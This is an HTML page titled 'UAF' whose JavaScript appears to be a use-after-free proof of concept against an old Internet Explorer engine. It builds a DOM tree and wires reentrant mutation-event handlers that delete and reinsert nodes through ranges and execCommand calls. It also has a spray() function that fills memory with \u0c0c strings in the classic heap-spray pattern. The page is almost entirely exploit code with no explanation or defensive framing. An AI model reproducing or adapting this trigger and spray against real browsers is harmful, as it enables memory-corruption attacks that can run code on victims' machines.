<!doctype html>		
<html>
	<head>
		<title>UAF</title>
		<meta id="mt01" http-equiv="Cache-Control" content="no-cache"/>
	</head>
	<style id="ggg"></style>
	<body>
	<script id="sc01"></script>
    <script id="sc02" type='text/javascript'>

		var entering = 0;
		
		function p(){
		entering++;
		alert(entering);
		}
		
		function bullet(event) {
			entering++;
			if (entering == 1) {

				range = document.createRange();
				range.setStart(ELEM1, 0);
				endNode = document.getElementById("ggg");
				range.setEnd(endNode, 0);
				randElem = ELEM9;
				range.collapse(true);

				ELEM0.innerHTML= null;
	
				spray();

				return;
			}

			if (entering == 2) {
				currElem = 0;
				range2 = document.body.createTextRange();

				range2.moveToElementText(ELEM1);
				range2.moveEnd('character', 0);

				ELEM1.addEventListener("DOMNodeInsertedIntoDocument", bullet, true);
				
				
				range = document.createRange();
				startNode = ELEM1;
				range.setStart(startNode, 0);
				endNode = ELEM9;
				range.setEnd(endNode, 0);

				randElem = document.getElementById("sc02");
				
				range.surroundContents(randElem);
				
				range2 = document.body.createTextRange();

				startNode = ELEM6;
				range2.moveToElementText(startNode);
				range2.moveEnd('character', 19);

				range2.select();
				range2.execCommand('insertFieldset', true, null);
				range2.moveEnd('sentence', '-10');

				
					TELEM0 = document.createElement('MAP');
					TELEM0.id = "tel30";
					
					ELEM9.appendChild(TELEM0);

					TELEM1 = document.createElement('S');
					TELEM1.id = "tel31";
					
					TITLE.appendChild(TELEM1);  //2:title

					TELEM2 = document.createElement('MARK');
					TELEM2.id= "tel32";

					document.getElementById("ggg").appendChild(TELEM2);

					TELEM3 = document.createElement('BASE');
					TELEM3.id= "tel33";

					HTML.appendChild(TELEM3);

					TELEM4 = document.createElement('DL');
					TELEM4.id= "tel34";

					ELEM6.appendChild(TELEM4);

					TELEM5 = document.createElement('OPTGROUP');
					TELEM5.id= "tel35";

					TITLE.appendChild(TELEM5);

					TELEM6 = document.createElement('SVG');
					TELEM6.id= "tel36";

					TELEM2.appendChild(TELEM6);

					TELEM7 = document.createElement('BDI');
					TELEM7.id= "tel37";

					ELEM0.appendChild(TELEM7);

					TELEM8 = document.createElement('THEAD');
					TELEM8.id= "tel38";

					document.getElementById("sc01").appendChild(TELEM8);

					TELEM9 = document.createElement('OPTGROUP');
					TELEM9.id= "tel39";

					ELEM2.appendChild(TELEM9);
				

				ELEM3.addEventListener("selectionchange", bullet, false);
				ELEM3.addEventListener("DOMSubtreeModified", bullet, true);
				return;
			}

			if (entering == 3) {
				range = document.createRange();
				startNode = document.getElementById("sc02");
				range.setStart(startNode, 0);
				endNode = ELEM6;
				range.setEnd(endNode, 0);
				range.setStartBefore(ELEM2);

				spray();

				return;
			}
			if (entering == 5) {

				spray(); //must have 

				return;
			}

			if (entering == 6) {
			
				range = document.createRange();
				startNode = TELEM9;
				range.setStart(startNode, 0);
				endNode = TELEM7;
				range.setEnd(endNode, 0);
				range.deleteContents();

			
				try {
				
					UELEM1 = document.createElement('PRE');
					UELEM1.id="u01";
					
					ELEM7.appendChild(UELEM1);

				} catch (e) {}

				ELEM1.addEventListener("DOMNodeRemovedFromDocument", bullet, true);
				ELEM1.addEventListener("DOMCharacterDataModified", bullet, true);

				return;
			}

			if (entering == 8) {
				range2 = document.body.createTextRange();

				startNode = ELEM0;
				range2.moveToElementText(startNode);
				range2.moveEnd('character', 9);

				range2.select();
				range2.execCommand('insertHorizontalRule', true, null);
				range2.moveEnd('sentence', '-10');

				try {
					
					
					eval('ELEM0.innerHTML= null');

					try {
						eval('ELEM0.outerHTML(1)');
					} catch (e) {};
					
					
					eval('ELEM0.innerText= null');

					eval('ELEM0.textContent = 0.000008');
					
				} catch (e) {};
				
					try {
						eval('ELEM2.innerHTML(ELEM2.parentNode)');
					} catch (e) {};
					
					try {
						eval('ELEM2.outerHTML(false)');
					} catch (e) {};
					
					try {
							eval('ELEM2.innerText=ELEM2.parentNode.innerText');
					} catch (e) {};
				

				return;
			}

			if (entering == 9) {
				range2 = document.body.createTextRange();

				startNode = document.getElementById("sc01");
				range2.moveToElementText(startNode);
				range2.moveEnd('character', 11);
				range2.select();
				range2.execCommand('delete', true, null);
				range2.moveEnd('sentence', '-10');

				try {
					VELEM0 = document.createElement('EM');
					VELEM0.id="v0";

					ELEM2.appendChild(VELEM0);

					VELEM2 = document.createElement('SUP');
					VELEM2.id="v2";

					ELEM0.appendChild(VELEM2);

					VELEM4 = document.createElement('HEADER');
					VELEM4.id="v4";

					ELEM8.appendChild(VELEM4);

					VELEM7 = document.createElement('TFOOT');
					VELEM7.id="v7";

					ELEM7.appendChild(VELEM7);

					VELEM8 = document.createElement('INS');
					VELEM8.id="v8";

					ELEM1.appendChild(VELEM8);

				} catch (e) {}


				return;
			}

			if (entering == 11) {
			
				range2 = document.body.createTextRange();

				startNode = VELEM2;
				range2.moveToElementText(startNode);
				range2.moveEnd('character', 10);
				range2.select();
				range2.execCommand('delete', true, null);
				range2.moveEnd('sentence', '-10');


				return;
			}

			if (entering == 12) {
			
				range2.execCommand('insertInputButton', true, null);
				
				event.target.addEventListener("DOMNodeRemoved", bullet, false);

				return;
			}


			if (entering == 16) {


				range2.execCommand('insertOrderedList', true, null);
				
				spray();

				return;
			}

		}

		function spray() {
			for (S = "\u0c0c", k = [], y = 0; y++ < 65; )
				y < 20 ? S += S : k[y] = [S.substr(22) + "\u0c0c\u0c0c"].join("")
		}

		function MYBuildElementsTree() {
			try {

				//styleSheet1 = document.createStyleSheet("");

				ELEM0 = document.createElement('TH');
				ELEM0.id = 'el0';
				document.getElementById("sc01").appendChild(ELEM0);
				ELEM0.addEventListener("DOMNodeRemoved", bullet, false);
	
				
				ELEM1 = document.createElement('SMALL');
				ELEM1.id = 'el1';
				ELEM0.appendChild(ELEM1);
				ELEM1.addEventListener("DOMNodeRemoved", bullet, false);

				ELEM2 = document.createElement('RT');
				ELEM2.id = 'el2';
				document.getElementById("ggg").appendChild(ELEM2);

				ELEM3 = document.createElement('COL');
				ELEM3.id = 'el3';
				ELEM0.appendChild(ELEM3);
				

				ELEM6 = document.createElement('INS');
				ELEM6.id = 'el6';
				ELEM0.appendChild(ELEM6);

				ELEM7 = document.createElement('VAR');
				ELEM7.id = 'el7';
				document.getElementById("mt01").appendChild(ELEM7);

				ELEM7.addEventListener("select", bullet, true);

		
				ELEM8 = document.createElement('KEYGEN');
				ELEM8.id = 'el8';
				document.getElementById("ggg").appendChild(ELEM8);

				ELEM8.addEventListener("DOMNodeInserted", bullet, true);

				ELEM9 = document.createElement("BASE");
	
				ELEM9.id = "el" + 9;
				ELEM8.appendChild(ELEM9);


			} catch (exception) {}

		}

		function MYFuzzing() {

			MYBuildElementsTree();
			alert("wait for a second");
		}
		
		var ELEM0, ELEM1, ELEM2, ELEM3, ELEM6, ELEM7, ELEM8, ELEM9;
		var TELEM0, TELEM1, TELEM2, TELEM3, TELEM4, TELEM5, TELEM6, TELEM7, TELEM8, TELEM9;
		var UELEM0, UELEM1;
		var VELEM0, VELEM1, VELEM2, VELEM3, VELEM4, VELEM5, VELEM6, VELEM7, VELEM8, VELEM9;
		var TITLE = document.all[2];
		var HTML = document.all[0];
		MYFuzzing();
		
		//next to do:change all elementTreex[] to ELEM1 s;
	</script>
</body>
</html>